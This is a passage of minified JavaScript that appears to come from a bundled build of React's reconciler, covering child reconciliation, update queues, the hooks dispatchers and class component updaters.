    }
    function m(f, a, p, v) {
        var N = a !== null ? a.key : null;
        if (typeof p == "string" && p !== "" || typeof p == "number")
            return N !== null ? null : u(f, a, "" + p, v);
        if (typeof p == "object" && p !== null) {
            switch (p.$$typeof) {
            case rr:
                return p.key === N ? s(f, a, p, v) : null;
            case Vt:
                return p.key === N ? d(f, a, p, v) : null;
            case be:
                return N = p._init,
                m(f, a, N(p._payload), v)
            }
            if (kn(p) || dn(p))
                return N !== null ? null : y(f, a, p, v, null);
            mr(f, p)
        }
        return null
    }
    function x(f, a, p, v, N) {
        if (typeof v == "string" && v !== "" || typeof v == "number")
            return f = f.get(p) || null,
            u(a, f, "" + v, N);
        if (typeof v == "object" && v !== null) {
            switch (v.$$typeof) {
            case rr:
                return f = f.get(v.key === null ? p : v.key) || null,
                s(a, f, v, N);
            case Vt:
                return f = f.get(v.key === null ? p : v.key) || null,
                d(a, f, v, N);
            case be:
                var j = v._init;
                return x(f, a, p, j(v._payload), N)
            }
            if (kn(v) || dn(v))
                return f = f.get(p) || null,
                y(a, f, v, N, null);
            mr(a, v)
        }
        return null
    }
    function k(f, a, p, v) {
        for (var N = null, j = null, E = a, Z = a = 0, U = null; E !== null && Z < p.length; Z++) {
            E.index > Z ? (U = E,
            E = null) : U = E.sibling;
            var _ = m(f, E, p[Z], v);
            if (_ === null) {
                E === null && (E = U);
                break
            }
            e && E && _.alternate === null && t(f, E),
            a = i(_, a, Z),
            j === null ? N = _ : j.sibling = _,
            j = _,
            E = U
        }
        if (Z === p.length)
            return n(f, E),
            G && xt(f, Z),
            N;
        if (E === null) {
            for (; Z < p.length; Z++)
                E = h(f, p[Z], v),
                E !== null && (a = i(E, a, Z),
                j === null ? N = E : j.sibling = E,
                j = E);
            return G && xt(f, Z),
            N
        }
        for (E = r(f, E); Z < p.length; Z++)
            U = x(E, f, Z, p[Z], v),
            U !== null && (e && U.alternate !== null && E.delete(U.key === null ? Z : U.key),
            a = i(U, a, Z),
            j === null ? N = U : j.sibling = U,
            j = U);
        return e && E.forEach(function(Ze) {
            return t(f, Ze)
        }),
        G && xt(f, Z),
        N
    }
    function w(f, a, p, v) {
        var N = dn(p);
        if (typeof N != "function")
            throw Error(g(150));
        if (p = N.call(p),
        p == null)
            throw Error(g(151));
        for (var j = N = null, E = a, Z = a = 0, U = null, _ = p.next(); E !== null && !_.done; Z++,
        _ = p.next()) {
            E.index > Z ? (U = E,
            E = null) : U = E.sibling;
            var Ze = m(f, E, _.value, v);
            if (Ze === null) {
                E === null && (E = U);
                break
            }
            e && E && Ze.alternate === null && t(f, E),
            a = i(Ze, a, Z),
            j === null ? N = Ze : j.sibling = Ze,
            j = Ze,
            E = U
        }
        if (_.done)
            return n(f, E),
            G && xt(f, Z),
            N;
        if (E === null) {
            for (; !_.done; Z++,
            _ = p.next())
                _ = h(f, _.value, v),
                _ !== null && (a = i(_, a, Z),
                j === null ? N = _ : j.sibling = _,
                j = _);
            return G && xt(f, Z),
            N
        }
        for (E = r(f, E); !_.done; Z++,
        _ = p.next())
            _ = x(E, f, Z, _.value, v),
            _ !== null && (e && _.alternate !== null && E.delete(_.key === null ? Z : _.key),
            a = i(_, a, Z),
            j === null ? N = _ : j.sibling = _,
            j = _);
        return e && E.forEach(function(an) {
            return t(f, an)
        }),
        G && xt(f, Z),
        N
    }
    function F(f, a, p, v) {
        if (typeof p == "object" && p !== null && p.type === Wt && p.key === null && (p = p.props.children),
        typeof p == "object" && p !== null) {
            switch (p.$$typeof) {
            case rr:
                e: {
                    for (var N = p.key, j = a; j !== null; ) {
                        if (j.key === N) {
                            if (N = p.type,
                            N === Wt) {
                                if (j.tag === 7) {
                                    n(f, j.sibling),
                                    a = l(j, p.props.children),
                                    a.return = f,
                                    f = a;
                                    break e
                                }
                            } else if (j.elementType === N || typeof N == "object" && N !== null && N.$$typeof === be && xu(N) === j.type) {
                                n(f, j.sibling),
                                a = l(j, p.props),
                                a.ref = yn(f, j, p),
                                a.return = f,
                                f = a;
                                break e
                            }
                            n(f, j);
                            break
                        } else
                            t(f, j);
                        j = j.sibling
                    }
                    p.type === Wt ? (a = jt(p.props.children, f.mode, v, p.key),
                    a.return = f,
                    f = a) : (v = Pr(p.type, p.key, p.props, null, f.mode, v),
                    v.ref = yn(f, a, p),
                    v.return = f,
                    f = v)
                }
                return o(f);
            case Vt:
                e: {
                    for (j = p.key; a !== null; ) {
                        if (a.key === j)
                            if (a.tag === 4 && a.stateNode.containerInfo === p.containerInfo && a.stateNode.implementation === p.implementation) {
                                n(f, a.sibling),
                                a = l(a, p.children || []),
                                a.return = f,
                                f = a;
                                break e
                            } else {
                                n(f, a);
                                break
                            }
                        else
                            t(f, a);
                        a = a.sibling
                    }
                    a = Jl(p, f.mode, v),
                    a.return = f,
                    f = a
                }
                return o(f);
            case be:
                return j = p._init,
                F(f, a, j(p._payload), v)
            }
            if (kn(p))
                return k(f, a, p, v);
            if (dn(p))
                return w(f, a, p, v);
            mr(f, p)
        }
        return typeof p == "string" && p !== "" || typeof p == "number" ? (p = "" + p,
        a !== null && a.tag === 6 ? (n(f, a.sibling),
        a = l(a, p),
        a.return = f,
        f = a) : (n(f, a),
        a = Hl(p, f.mode, v),
        a.return = f,
        f = a),
        o(f)) : n(f, a)
    }
    return F
}
var tn = oa(!0)
  , ua = oa(!1)
  , Hr = ht(null)
  , Jr = null
  , Ut = null
  , ao = null;
function co() {
    ao = Ut = Jr = null
}
function fo(e) {
    var t = Hr.current;
    I(Hr),
    e._currentValue = t
}
function Ni(e, t, n) {
    for (; e !== null; ) {
        var r = e.alternate;
        if ((e.childLanes & t) !== t ? (e.childLanes |= t,
        r !== null && (r.childLanes |= t)) : r !== null && (r.childLanes & t) !== t && (r.childLanes |= t),
        e === n)
            break;
        e = e.return
    }
}
function At(e, t) {
    Jr = e,
    ao = Ut = null,
    e = e.dependencies,
    e !== null && e.firstContext !== null && (e.lanes & t && (ce = !0),
    e.firstContext = null)
}
function je(e) {
    var t = e._currentValue;
    if (ao !== e)
        if (e = {
            context: e,
            memoizedValue: t,
            next: null
        },
        Ut === null) {
            if (Jr === null)
                throw Error(g(308));
            Ut = e,
            Jr.dependencies = {
                lanes: 0,
                firstContext: e
            }
        } else
            Ut = Ut.next = e;
    return t
}
var St = null;
function po(e) {
    St === null ? St = [e] : St.push(e)
}
function sa(e, t, n, r) {
    var l = t.interleaved;
    return l === null ? (n.next = n,
    po(t)) : (n.next = l.next,
    l.next = n),
    t.interleaved = n,
    Ke(e, r)
}
function Ke(e, t) {
    e.lanes |= t;
    var n = e.alternate;
    for (n !== null && (n.lanes |= t),
    n = e,
    e = e.return; e !== null; )
        e.childLanes |= t,
        n = e.alternate,
        n !== null && (n.childLanes |= t),
        n = e,
        e = e.return;
    return n.tag === 3 ? n.stateNode : null
}
var qe = !1;
function mo(e) {
    e.updateQueue = {
        baseState: e.memoizedState,
        firstBaseUpdate: null,
        lastBaseUpdate: null,
        shared: {
            pending: null,
            interleaved: null,
            lanes: 0
        },
        effects: null
    }
}
function aa(e, t) {
    e = e.updateQueue,
    t.updateQueue === e && (t.updateQueue = {
        baseState: e.baseState,
        firstBaseUpdate: e.firstBaseUpdate,
        lastBaseUpdate: e.lastBaseUpdate,
        shared: e.shared,
        effects: e.effects
    })
}
function Be(e, t) {
    return {
        eventTime: e,
        lane: t,
        tag: 0,
        payload: null,
        callback: null,
        next: null
    }
}
function st(e, t, n) {
    var r = e.updateQueue;
    if (r === null)
        return null;
    if (r = r.shared,
    P & 2) {
        var l = r.pending;
        return l === null ? t.next = t : (t.next = l.next,
        l.next = t),
        r.pending = t,
        Ke(e, n)
    }
    return l = r.interleaved,
    l === null ? (t.next = t,
    po(r)) : (t.next = l.next,
    l.next = t),
    r.interleaved = t,
    Ke(e, n)
}
function Er(e, t, n) {
    if (t = t.updateQueue,
    t !== null && (t = t.shared,
    (n & 4194240) !== 0)) {
        var r = t.lanes;
        r &= e.pendingLanes,
        n |= r,
        t.lanes = n,
        bi(e, n)
    }
}
function ku(e, t) {
    var n = e.updateQueue
      , r = e.alternate;
    if (r !== null && (r = r.updateQueue,
    n === r)) {
        var l = null
          , i = null;
        if (n = n.firstBaseUpdate,
        n !== null) {
            do {
                var o = {
                    eventTime: n.eventTime,
                    lane: n.lane,
                    tag: n.tag,
                    payload: n.payload,
                    callback: n.callback,
                    next: null
                };
                i === null ? l = i = o : i = i.next = o,
                n = n.next
            } while (n !== null);
            i === null ? l = i = t : i = i.next = t
        } else
            l = i = t;
        n = {
            baseState: r.baseState,
            firstBaseUpdate: l,
            lastBaseUpdate: i,
            shared: r.shared,
            effects: r.effects
        },
        e.updateQueue = n;
        return
    }
    e = n.lastBaseUpdate,
    e === null ? n.firstBaseUpdate = t : e.next = t,
    n.lastBaseUpdate = t
}
function Kr(e, t, n, r) {
    var l = e.updateQueue;
    qe = !1;
    var i = l.firstBaseUpdate
      , o = l.lastBaseUpdate
      , u = l.shared.pending;
    if (u !== null) {
        l.shared.pending = null;
        var s = u
          , d = s.next;
        s.next = null,
        o === null ? i = d : o.next = d,
        o = s;
        var y = e.alternate;
        y !== null && (y = y.updateQueue,
        u = y.lastBaseUpdate,
        u !== o && (u === null ? y.firstBaseUpdate = d : u.next = d,
        y.lastBaseUpdate = s))
    }
    if (i !== null) {
        var h = l.baseState;
        o = 0,
        y = d = s = null,
        u = i;
        do {
            var m = u.lane
              , x = u.eventTime;
            if ((r & m) === m) {
                y !== null && (y = y.next = {
                    eventTime: x,
                    lane: 0,
                    tag: u.tag,
                    payload: u.payload,
                    callback: u.callback,
                    next: null
                });
                e: {
                    var k = e
                      , w = u;
                    switch (m = t,
                    x = n,
                    w.tag) {
                    case 1:
                        if (k = w.payload,
                        typeof k == "function") {
                            h = k.call(x, h, m);
                            break e
                        }
                        h = k;
                        break e;
                    case 3:
                        k.flags = k.flags & -65537 | 128;
                    case 0:
                        if (k = w.payload,
                        m = typeof k == "function" ? k.call(x, h, m) : k,
                        m == null)
                            break e;
                        h = X({}, h, m);
                        break e;
                    case 2:
                        qe = !0
                    }
                }
                u.callback !== null && u.lane !== 0 && (e.flags |= 64,
                m = l.effects,
                m === null ? l.effects = [u] : m.push(u))
            } else
                x = {
                    eventTime: x,
                    lane: m,
                    tag: u.tag,
                    payload: u.payload,
                    callback: u.callback,
                    next: null
                },
                y === null ? (d = y = x,
                s = h) : y = y.next = x,
                o |= m;
            if (u = u.next,
            u === null) {
                if (u = l.shared.pending,
                u === null)
                    break;
                m = u,
                u = m.next,
                m.next = null,
                l.lastBaseUpdate = m,
                l.shared.pending = null
            }
        } while (!0);
        if (y === null && (s = h),
        l.baseState = s,
        l.firstBaseUpdate = d,
        l.lastBaseUpdate = y,
        t = l.shared.interleaved,
        t !== null) {
            l = t;
            do
                o |= l.lane,
                l = l.next;
            while (l !== t)
        } else
            i === null && (l.shared.lanes = 0);
        Tt |= o,
        e.lanes = o,
        e.memoizedState = h
    }
}
function wu(e, t, n) {
    if (e = t.effects,
    t.effects = null,
    e !== null)
        for (t = 0; t < e.length; t++) {
            var r = e[t]
              , l = r.callback;
            if (l !== null) {
                if (r.callback = null,
                r = n,
                typeof l != "function")
                    throw Error(g(191, l));
                l.call(r)
            }
        }
}
var qn = {}
  , Oe = ht(qn)
  , Un = ht(qn)
  , Dn = ht(qn);
function Nt(e) {
    if (e === qn)
        throw Error(g(174));
    return e
}
function ho(e, t) {
    switch (V(Dn, t),
    V(Un, e),
    V(Oe, qn),
    e = t.nodeType,
    e) {
    case 9:
    case 11:
        t = (t = t.documentElement) ? t.namespaceURI : ri(null, "");
        break;
    default:
        e = e === 8 ? t.parentNode : t,
        t = e.namespaceURI || null,
        e = e.tagName,
        t = ri(t, e)
    }
    I(Oe),
    V(Oe, t)
}
function nn() {
    I(Oe),
    I(Un),
    I(Dn)
}
function ca(e) {
    Nt(Dn.current);
    var t = Nt(Oe.current)
      , n = ri(t, e.type);
    t !== n && (V(Un, e),
    V(Oe, n))
}
function yo(e) {
    Un.current === e && (I(Oe),
    I(Un))
}
var M = ht(0);
function Qr(e) {
    for (var t = e; t !== null; ) {
        if (t.tag === 13) {
            var n = t.memoizedState;
            if (n !== null && (n = n.dehydrated,
            n === null || n.data === "$?" || n.data === "$!"))
                return t
        } else if (t.tag === 19 && t.memoizedProps.revealOrder !== void 0) {
            if (t.flags & 128)
                return t
        } else if (t.child !== null) {
            t.child.return = t,
            t = t.child;
            continue
        }
        if (t === e)
            break;
        for (; t.sibling === null; ) {
            if (t.return === null || t.return === e)
                return null;
            t = t.return
        }
        t.sibling.return = t.return,
        t = t.sibling
    }
    return null
}
var Ol = [];
function vo() {
    for (var e = 0; e < Ol.length; e++)
        Ol[e]._workInProgressVersionPrimary = null;
    Ol.length = 0
}
var Zr = Ae.ReactCurrentDispatcher
  , Xl = Ae.ReactCurrentBatchConfig
  , zt = 0
  , O = null
  , J = null
  , A = null
  , Ar = !1
  , zn = !1
  , Bn = 0
  , nf = 0;
function te() {
    throw Error(g(321))
}
function go(e, t) {
    if (t === null)
        return !1;
    for (var n = 0; n < t.length && n < e.length; n++)
        if (!Ve(e[n], t[n]))
            return !1;
    return !0
}
function xo(e, t, n, r, l, i) {
    if (zt = i,
    O = t,
    t.memoizedState = null,
    t.updateQueue = null,
    t.lanes = 0,
    Zr.current = e === null || e.memoizedState === null ? uf : sf,
    e = n(r, l),
    zn) {
        i = 0;
        do {
            if (zn = !1,
            Bn = 0,
            25 <= i)
                throw Error(g(301));
            i += 1,
            A = J = null,
            t.updateQueue = null,
            Zr.current = af,
            e = n(r, l)
        } while (zn)
    }
    if (Zr.current = $r,
    t = J !== null && J.next !== null,
    zt = 0,
    A = J = O = null,
    Ar = !1,
    t)
        throw Error(g(300));
    return e
}
function ko() {
    var e = Bn !== 0;
    return Bn = 0,
    e
}
function Ie() {
    var e = {
        memoizedState: null,
        baseState: null,
        baseQueue: null,
        queue: null,
        next: null
    };
    return A === null ? O.memoizedState = A = e : A = A.next = e,
    A
}
function Ee() {
    if (J === null) {
        var e = O.alternate;
        e = e !== null ? e.memoizedState : null
    } else
        e = J.next;
    var t = A === null ? O.memoizedState : A.next;
    if (t !== null)
        A = t,
        J = e;
    else {
        if (e === null)
            throw Error(g(310));
        J = e,
        e = {
            memoizedState: J.memoizedState,
            baseState: J.baseState,
            baseQueue: J.baseQueue,
            queue: J.queue,
            next: null
        },
        A === null ? O.memoizedState = A = e : A = A.next = e
    }
    return A
}
function Hn(e, t) {
    return typeof t == "function" ? t(e) : t
}
function Yl(e) {
    var t = Ee()
      , n = t.queue;
    if (n === null)
        throw Error(g(311));
    n.lastRenderedReducer = e;
    var r = J
      , l = r.baseQueue
      , i = n.pending;
    if (i !== null) {
        if (l !== null) {
            var o = l.next;
            l.next = i.next,
            i.next = o
        }
        r.baseQueue = l = i,
        n.pending = null
    }
    if (l !== null) {
        i = l.next,
        r = r.baseState;
        var u = o = null
          , s = null
          , d = i;
        do {
            var y = d.lane;
            if ((zt & y) === y)
                s !== null && (s = s.next = {
                    lane: 0,
                    action: d.action,
                    hasEagerState: d.hasEagerState,
                    eagerState: d.eagerState,
                    next: null
                }),
                r = d.hasEagerState ? d.eagerState : e(r, d.action);
            else {
                var h = {
                    lane: y,
                    action: d.action,
                    hasEagerState: d.hasEagerState,
                    eagerState: d.eagerState,
                    next: null
                };
                s === null ? (u = s = h,
                o = r) : s = s.next = h,
                O.lanes |= y,
                Tt |= y
            }
            d = d.next
        } while (d !== null && d !== i);
        s === null ? o = r : s.next = u,
        Ve(r, t.memoizedState) || (ce = !0),
        t.memoizedState = r,
        t.baseState = o,
        t.baseQueue = s,
        n.lastRenderedState = r
    }
    if (e = n.interleaved,
    e !== null) {
        l = e;
        do
            i = l.lane,
            O.lanes |= i,
            Tt |= i,
            l = l.next;
        while (l !== e)
    } else
        l === null && (n.lanes = 0);
    return [t.memoizedState, n.dispatch]
}
function Ul(e) {
    var t = Ee()
      , n = t.queue;
    if (n === null)
        throw Error(g(311));
    n.lastRenderedReducer = e;
    var r = n.dispatch
      , l = n.pending
      , i = t.memoizedState;
    if (l !== null) {
        n.pending = null;
        var o = l = l.next;
        do
            i = e(i, o.action),
            o = o.next;
        while (o !== l);
        Ve(i, t.memoizedState) || (ce = !0),
        t.memoizedState = i,
        t.baseQueue === null && (t.baseState = i),
        n.lastRenderedState = i
    }
    return [i, r]
}
function da() {}
function fa(e, t) {
    var n = O
      , r = Ee()
      , l = t()
      , i = !Ve(r.memoizedState, l);
    if (i && (r.memoizedState = l,
    ce = !0),
    r = r.queue,
    wo(ha.bind(null, n, r, e), [e]),
    r.getSnapshot !== t || i || A !== null && A.memoizedState.tag & 1) {
        if (n.flags |= 2048,
        Jn(9, ma.bind(null, n, r, l, t), void 0, null),
        $ === null)
            throw Error(g(349));
        zt & 30 || pa(n, t, l)
    }
    return l
}
function pa(e, t, n) {
    e.flags |= 16384,
    e = {
        getSnapshot: t,
        value: n
    },
    t = O.updateQueue,
    t === null ? (t = {
        lastEffect: null,
        stores: null
    },
    O.updateQueue = t,
    t.stores = [e]) : (n = t.stores,
    n === null ? t.stores = [e] : n.push(e))
}
function ma(e, t, n, r) {
    t.value = n,
    t.getSnapshot = r,
    ya(t) && va(e)
}
function ha(e, t, n) {
    return n(function() {
        ya(t) && va(e)
    })
}
function ya(e) {
    var t = e.getSnapshot;
    e = e.value;
    try {
        var n = t();
        return !Ve(e, n)
    } catch {
        return !0
    }
}
function va(e) {
    var t = Ke(e, 1);
    t !== null && Le(t, e, 1, -1)
}
function Su(e) {
    var t = Ie();
    return typeof e == "function" && (e = e()),
    t.memoizedState = t.baseState = e,
    e = {
        pending: null,
        interleaved: null,
        lanes: 0,
        dispatch: null,
        lastRenderedReducer: Hn,
        lastRenderedState: e
    },
    t.queue = e,
    e = e.dispatch = of.bind(null, O, e),
    [t.memoizedState, e]
}
function Jn(e, t, n, r) {
    return e = {
        tag: e,
        create: t,
        destroy: n,
        deps: r,
        next: null
    },
    t = O.updateQueue,
    t === null ? (t = {
        lastEffect: null,
        stores: null
    },
    O.updateQueue = t,
    t.lastEffect = e.next = e) : (n = t.lastEffect,
    n === null ? t.lastEffect = e.next = e : (r = n.next,
    n.next = e,
    e.next = r,
    t.lastEffect = e)),
    e
}
function ga() {
    return Ee().memoizedState
}
function zr(e, t, n, r) {
    var l = Ie();
    O.flags |= e,
    l.memoizedState = Jn(1 | t, n, void 0, r === void 0 ? null : r)
}
function cl(e, t, n, r) {
    var l = Ee();
    r = r === void 0 ? null : r;
    var i = void 0;
    if (J !== null) {
        var o = J.memoizedState;
        if (i = o.destroy,
        r !== null && go(r, o.deps)) {
            l.memoizedState = Jn(t, n, i, r);
            return
        }
    }
    O.flags |= e,
    l.memoizedState = Jn(1 | t, n, i, r)
}
function Nu(e, t) {
    return zr(8390656, 8, e, t)
}
function wo(e, t) {
    return cl(2048, 8, e, t)
}
function xa(e, t) {
    return cl(4, 2, e, t)
}
function ka(e, t) {
    return cl(4, 4, e, t)
}
function wa(e, t) {
    if (typeof t == "function")
        return e = e(),
        t(e),
        function() {
            t(null)
        }
        ;
    if (t != null)
        return e = e(),
        t.current = e,
        function() {
            t.current = null
        }
}
function Sa(e, t, n) {
    return n = n != null ? n.concat([e]) : null,
    cl(4, 4, wa.bind(null, t, e), n)
}
function So() {}
function Na(e, t) {
    var n = Ee();
    t = t === void 0 ? null : t;
    var r = n.memoizedState;
    return r !== null && t !== null && go(t, r[1]) ? r[0] : (n.memoizedState = [e, t],
    e)
}
function Ca(e, t) {
    var n = Ee();
    t = t === void 0 ? null : t;
    var r = n.memoizedState;
    return r !== null && t !== null && go(t, r[1]) ? r[0] : (e = e(),
    n.memoizedState = [e, t],
    e)
}
function ja(e, t, n) {
    return zt & 21 ? (Ve(n, t) || (n = Rs(),
    O.lanes |= n,
    Tt |= n,
    e.baseState = !0),
    t) : (e.baseState && (e.baseState = !1,
    ce = !0),
    e.memoizedState = n)
}
function rf(e, t) {
    var n = L;
    L = n !== 0 && 4 > n ? n : 4,
    e(!0);
    var r = Xl.transition;
    Xl.transition = {};
    try {
        e(!1),
        t()
    } finally {
        L = n,
        Xl.transition = r
    }
}
function Ea() {
    return Ee().memoizedState
}
function lf(e, t, n) {
    var r = ct(e);
    if (n = {
        lane: r,
        action: n,
        hasEagerState: !1,
        eagerState: null,
        next: null
    },
    Za(e))
        za(t, n);
    else if (n = sa(e, t, n, r),
    n !== null) {
        var l = oe();
        Le(n, e, r, l),
        Ta(n, t, r)
    }
}
function of(e, t, n) {
    var r = ct(e)
      , l = {
        lane: r,
        action: n,
        hasEagerState: !1,
        eagerState: null,
        next: null
    };
    if (Za(e))
        za(t, l);
    else {
        var i = e.alternate;
        if (e.lanes === 0 && (i === null || i.lanes === 0) && (i = t.lastRenderedReducer,
        i !== null))
            try {
                var o = t.lastRenderedState
                  , u = i(o, n);
                if (l.hasEagerState = !0,
                l.eagerState = u,
                Ve(u, o)) {
                    var s = t.interleaved;
                    s === null ? (l.next = l,
                    po(t)) : (l.next = s.next,
                    s.next = l),
                    t.interleaved = l;
                    return
                }
            } catch {} finally {}
        n = sa(e, t, l, r),
        n !== null && (l = oe(),
        Le(n, e, r, l),
        Ta(n, t, r))
    }
}
function Za(e) {
    var t = e.alternate;
    return e === O || t !== null && t === O
}
function za(e, t) {
    zn = Ar = !0;
    var n = e.pending;
    n === null ? t.next = t : (t.next = n.next,
    n.next = t),
    e.pending = t
}
function Ta(e, t, n) {
    if (n & 4194240) {
        var r = t.lanes;
        r &= e.pendingLanes,
        n |= r,
        t.lanes = n,
        bi(e, n)
    }
}
var $r = {
    readContext: je,
    useCallback: te,
    useContext: te,
    useEffect: te,
    useImperativeHandle: te,
    useInsertionEffect: te,
    useLayoutEffect: te,
    useMemo: te,
    useReducer: te,
    useRef: te,
    useState: te,
    useDebugValue: te,
    useDeferredValue: te,
    useTransition: te,
    useMutableSource: te,
    useSyncExternalStore: te,
    useId: te,
    unstable_isNewReconciler: !1
}
  , uf = {
    readContext: je,
    useCallback: function(e, t) {
        return Ie().memoizedState = [e, t === void 0 ? null : t],
        e
    },
    useContext: je,
    useEffect: Nu,
    useImperativeHandle: function(e, t, n) {
        return n = n != null ? n.concat([e]) : null,
        zr(4194308, 4, wa.bind(null, t, e), n)
    },
    useLayoutEffect: function(e, t) {
        return zr(4194308, 4, e, t)
    },
    useInsertionEffect: function(e, t) {
        return zr(4, 2, e, t)
    },
    useMemo: function(e, t) {
        var n = Ie();
        return t = t === void 0 ? null : t,
        e = e(),
        n.memoizedState = [e, t],
        e
    },
    useReducer: function(e, t, n) {
        var r = Ie();
        return t = n !== void 0 ? n(t) : t,
        r.memoizedState = r.baseState = t,
        e = {
            pending: null,
            interleaved: null,
            lanes: 0,
            dispatch: null,
            lastRenderedReducer: e,
            lastRenderedState: t
        },
        r.queue = e,
        e = e.dispatch = lf.bind(null, O, e),
        [r.memoizedState, e]
    },
    useRef: function(e) {
        var t = Ie();
        return e = {
            current: e
        },
        t.memoizedState = e
    },
    useState: Su,
    useDebugValue: So,
    useDeferredValue: function(e) {
        return Ie().memoizedState = e
    },
    useTransition: function() {
        var e = Su(!1)
          , t = e[0];
        return e = rf.bind(null, e[1]),
        Ie().memoizedState = e,
        [t, e]
    },
    useMutableSource: function() {},
    useSyncExternalStore: function(e, t, n) {
        var r = O
          , l = Ie();
        if (G) {
            if (n === void 0)
                throw Error(g(407));
            n = n()
        } else {
            if (n = t(),
            $ === null)
                throw Error(g(349));
            zt & 30 || pa(r, t, n)
        }
        l.memoizedState = n;
        var i = {
            value: n,
            getSnapshot: t
        };
        return l.queue = i,
        Nu(ha.bind(null, r, i, e), [e]),
        r.flags |= 2048,
        Jn(9, ma.bind(null, r, i, n, t), void 0, null),
        n
    },
    useId: function() {
        var e = Ie()
          , t = $.identifierPrefix;
        if (G) {
            var n = De
              , r = Ue;
            n = (r & ~(1 << 32 - Pe(r) - 1)).toString(32) + n,
            t = ":" + t + "R" + n,
            n = Bn++,
            0 < n && (t += "H" + n.toString(32)),
            t += ":"
        } else
            n = nf++,
            t = ":" + t + "r" + n.toString(32) + ":";
        return e.memoizedState = t
    },
    unstable_isNewReconciler: !1
}
  , sf = {
    readContext: je,
    useCallback: Na,
    useContext: je,
    useEffect: wo,
    useImperativeHandle: Sa,
    useInsertionEffect: xa,
    useLayoutEffect: ka,
    useMemo: Ca,
    useReducer: Yl,
    useRef: ga,
    useState: function() {
        return Yl(Hn)
    },
    useDebugValue: So,
    useDeferredValue: function(e) {
        var t = Ee();
        return ja(t, J.memoizedState, e)
    },
    useTransition: function() {
        var e = Yl(Hn)[0]
          , t = Ee().memoizedState;
        return [e, t]
    },
    useMutableSource: da,
    useSyncExternalStore: fa,
    useId: Ea,
    unstable_isNewReconciler: !1
}
  , af = {
    readContext: je,
    useCallback: Na,
    useContext: je,
    useEffect: wo,
    useImperativeHandle: Sa,
    useInsertionEffect: xa,
    useLayoutEffect: ka,
    useMemo: Ca,
    useReducer: Ul,
    useRef: ga,
    useState: function() {
        return Ul(Hn)
    },
    useDebugValue: So,
    useDeferredValue: function(e) {
        var t = Ee();
        return J === null ? t.memoizedState = e : ja(t, J.memoizedState, e)
    },
    useTransition: function() {
        var e = Ul(Hn)[0]
          , t = Ee().memoizedState;
        return [e, t]
    },
    useMutableSource: da,
    useSyncExternalStore: fa,
    useId: Ea,
    unstable_isNewReconciler: !1
};
function Te(e, t) {
    if (e && e.defaultProps) {
        t = X({}, t),
        e = e.defaultProps;
        for (var n in e)
            t[n] === void 0 && (t[n] = e[n]);
        return t
    }
    return t
}
function Ci(e, t, n, r) {
    t = e.memoizedState,
    n = n(r, t),
    n = n == null ? t : X({}, t, n),
    e.memoizedState = n,
    e.lanes === 0 && (e.updateQueue.baseState = n)
}
var dl = {
    isMounted: function(e) {
        return (e = e._reactInternals) ? Pt(e) === e : !1
    },
    enqueueSetState: function(e, t, n) {
        e = e._reactInternals;
        var r = oe()
          , l = ct(e)
          , i = Be(r, l);
        i.payload = t,
        n != null && (i.callback = n),
        t = st(e, i, l),
        t !== null && (Le(t, e, l, r),
        Er(t, e, l))
    },
    enqueueReplaceState: function(e, t, n) {
        e = e._reactInternals;
        var r = oe()
          , l = ct(e)
          , i = Be(r, l);
        i.tag = 1,
        i.payload = t,
        n != null && (i.callback = n),
        t = st(e, i, l),
        t !== null && (Le(t, e, l, r),
        Er(t, e, l))
    },
    enqueueForceUpdate: function(e, t) {
        e = e._reactInternals;
        var n = oe()
          , r = ct(e)
          , l = Be(n, r);
        l.tag = 2,
        t != null && (l.callback = t),
        t = st(e, l, r),
        t !== null && (Le(t, e, r, n),
        Er(t, e, r))
    }
};
function Cu(e, t, n, r, l, i, o) {
    return e = e.stateNode,
    typeof e.shouldComponentUpdate == "function" ? e.shouldComponentUpdate(r, i, o) : t.prototype && t.prototype.isPureReactComponent ? !Mn(n, r) || !Mn(l, i) : !0
}
function Ra(e, t, n) {
    var r = !1
      , l = pt
      , i = t.contextType;
    return typeof i == "object" && i !== null ? i = je(i) : (l = fe(t) ? Et : le.current,
    r = t.contextTypes,
    i = (r = r != null) ? qt(e, l) : pt),
    t = new t(n,i),
    e.memoizedState = t.state !== null && t.state !== void 0 ? t.state : null,
    t.updater = dl,
    e.stateNode = t,
    t._reactInternals = e,
    r && (e = e.stateNode,
    e.__reactInternalMemoizedUnmaskedChildContext = l,
    e.__reactInternalMemoizedMaskedChildContext = i),
    t
}
function ju(e, t, n, r) {
    e = t.state,
    typeof t.componentWillReceiveProps == "function" && t.componentWillReceiveProps(n, r),
    typeof t.UNSAFE_componentWillReceiveProps == "function" && t.UNSAFE_componentWillReceiveProps(n, r),
    t.state !== e && dl.enqueueReplaceState(t, t.state, null)
}
function ji(e, t, n, r) {
    var l = e.stateNode;
    l.props = n,
    l.state = e.memoizedState,
    l.refs = {},
    mo(e);
    var i = t.contextType;
    typeof i == "object" && i !== null ? l.context = je(i) : (i = fe(t) ? Et : le.current,
    l.context = qt(e, i)),
    l.state = e.memoizedState,
    i = t.getDerivedStateFromProps,
    typeof i == "function" && (Ci(e, t, i, n),
    l.state = e.memoizedState),
    typeof t.getDerivedStateFromProps == "function" || typeof l.getSnapshotBeforeUpdate == "function" || typeof l.UNSAFE_componentWillMount != "function" && typeof l.componentWillMount != "function" || (t = l.state,
    typeof l.componentWillMount == "function" && l.componentWillMount(),
    typeof l.UNSAFE_componentWillMount == "function" && l.UNSAFE_componentWillMount(),
    t !== l.state && dl.enqueueReplaceState(l, l.state, null),
    Kr(e, n, l, r),
    l.state = e.memoizedState),
    typeof l.componentDidMount == "function" && (e.flags |= 4194308)
}
function rn(e, t) {
    try {
        var n = ""
          , r = t;
        do
            n += Ic(r),
            r = r.return;
        while (r);
        var l = n
    } catch (i) {
        l = `
Error generating stack: ` + i.message + `
` + i.stack
    }
    return {
        value: e,
        source: t,
        stack: l,
        digest: null
    }
}
function Dl(e, t, n) {
    return {
        value: e,
        source: null,
        stack: n ?? null,
        digest: t ?? null
    }
}
function Ei(e, t) {
    try {
        console.error(t.value)
    } catch (n) {
        setTimeout(function() {
            throw n
        })
    }
}
var cf = typeof WeakMap == "function" ? WeakMap : Map;
function _a(e, t, n) {
    n = Be(-1, n),
    n.tag = 3,
    n.payload = {
        element: null
    };
    var r = t.value;
    return n.callback = function() {
        qr || (qr = !0,
        Ii = r),
        Ei(e, t)
    }
    ,
    n
}
function Pa(e, t, n) {
    n = Be(-1, n),
    n.tag = 3;
    var r = e.type.getDerivedStateFromError;
    if (typeof r == "function") {
        var l = t.value;
        n.payload = function() {
            return r(l)
        }
        ,
        n.callback = function() {
            Ei(e, t)
        }
    }
    var i = e.stateNode;
